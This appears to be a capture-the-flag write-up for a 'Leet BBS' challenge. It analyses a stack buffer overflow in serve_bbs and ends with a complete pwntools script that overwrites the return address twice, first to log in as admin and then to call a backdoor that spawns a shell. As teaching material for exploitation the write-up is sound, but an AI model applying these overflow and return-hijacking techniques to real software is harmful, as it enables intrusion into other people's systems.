### Challenge Overview

The Leet BBS target presents a classic memory corruption scenario. The objective is to leverage an off-by-prefix stack buffer overflow to achieve arbitrary execution and spawn a root shell.

### Vulnerability Analysis

The core vulnerability resides within the `serve_bbs` function, which allocates a local 128-byte character buffer. A post is constructed by concatenating a 10-byte prefix (`\n=======]` ), a user-supplied title of up to 31 bytes, and a 10-byte suffix ( `[=======\n`). The vulnerability is triggered during the body construction, where a `memcpy` operation forcefully copies up to 128 bytes into this same buffer without validating the total contiguous length. Because the prefix, title, and suffix already occupy up to 51 bytes of the initial memory space, the 128-byte body payload massively overflows the stack frame's boundaries, granting a primitive to clobber the Saved Base Pointer (RBP) and the Instruction Pointer (RIP).
### Exploitation Strategy

Exploitation occurs in two distinct stages, preceded by an input constraint bypass. The application limits standard reads via `fgets`, which truncates payloads requiring 130+ bytes to reach the RIP. To bypass this, standard input (`stdin`) buffering is abused by supplying a full 156-byte payload at the initial Title prompt. `fgets` legitimately consumes only the first 31 bytes, queuing the remaining 125 bytes in the `stdin` stream. These bytes are subsequently consumed by the vulnerable `memcpy` block without truncation.

Empirical stack mapping dictates an offset of 132 bytes of padding (alongside an 8-byte RBP clobber) to achieve execution control.

**Stage 1: Admin Resurrection** The first overflow redirects the RIP to the `login_as_admin` function (`0x400bce`). By jumping precisely to the function prologue (`push rbp`, `mov rbp, rsp`), a clean stack frame is initialized, stabilizing the previously corrupted RBP and preventing a segmentation fault. Submitting the hardcoded password elevates privileges within the application state.

**Stage 2: Parameter Grooming and The Killshot** The final objective is executing the `backdoor(code, data)` function (`0x400b8a`) to trigger `system("sh")`. This requires aligning registers to x86-64 calling conventions: `rdi=1` and `rsi="sh"`. Leveraging the newly acquired admin privileges, the server name is reconfigured to "sh". When `serve_bbs` loops, it performs a native `write(1, g_server_name, ...)` call, which perfectly grooms the registers to our exact requirements just before a second overflow is triggered. Returning directly to the `backdoor` address with pre-groomed registers successfully yields an interactive root shell

```python
import struct
from pwn import *
import interact

# --- Constants & Addresses ---
LOGIN_AS_ADMIN_ADDR = 0x400bce
BACKDOOR_ADDR = 0x400b8a
ADMIN_PASSWORD = b"l0ln0onewillguessth1s"

# --- Helper Functions ---
def press_enter(p):
	"""Quickly send a space/enter when the program requires it."""
	p.readuntil(b"...")
	p.sendline(b" ")

def enter_choice(p, choice):
	"""Quickly send a choice to the menu."""
	p.readuntil(b"Enter choice: ")
	p.sendline(str(choice).encode())

def trigger_overflow(p, index_of_post):
	"""Triggers the memcpy overflow and forces the CPU to execute 'ret'."""
	enter_choice(p, index_of_post) # View the Post (Triggers the memcpy overflow)
	press_enter(p)
	enter_choice(p, 2)             # Exit the menu (Forces the CPU to execute 'ret')

  

def generate_send_payload(p, target_addr):
	"""Generates and sends the precise ROP/overflow payload."""
	# Payload Breakdown:
	# - 132 bytes of initial padding
	# - Z is the first character that shows up in rbx. F fills the rest of rbx.
	# - K fills the rbp.
	# - Finally, the rip is overwritten with the target_addr.
	payload = (
		b'A' * 31 +
		b'B' * 76 +
		b'D' * 25 +
		b"Z" +
		b"F" * 7 +
		b"K" * 8 +
		p64(target_addr)
	)
	p.sendline(payload)
  

p = interact.Process()

# ==========================================
# Part 1: Getting Admin Privilege
# ==========================================
print("Executing Part 1: Overwriting return address to login_as_admin")
enter_choice(p, 1)
p.readuntil(b":             |")

generate_send_payload(p, LOGIN_AS_ADMIN_ADDR)
press_enter(p)

# Trigger the overflow
trigger_overflow(p, 3)

# Supply the hardcoded password to gain admin privilege
p.readuntil(b"+-----------------------------+")
p.sendline(ADMIN_PASSWORD)
press_enter(p)
print("Admin privileges acquired!")


# ==========================================
# Part 2: The Killshot (Getting the Shell)
# ==========================================
print("Executing Part 2: Changing server name and jumping to backdoor")
enter_choice(p, 0) # Enter the Admin Configuration
enter_choice(p, 1)

p.readuntil(b"name: ")
# rsi = "sh". We use the hidden menu (Choice 0) to change the Server Name to "sh".
p.sendline(b"sh")

enter_choice(p, 1)
p.readuntil(b":             |")

generate_send_payload(p, BACKDOOR_ADDR)
press_enter(p)

# Trigger the overflow one last time
trigger_overflow(p, 4)

print("Exploit finished. Dropping to interactive shell!")

p.interactive()
```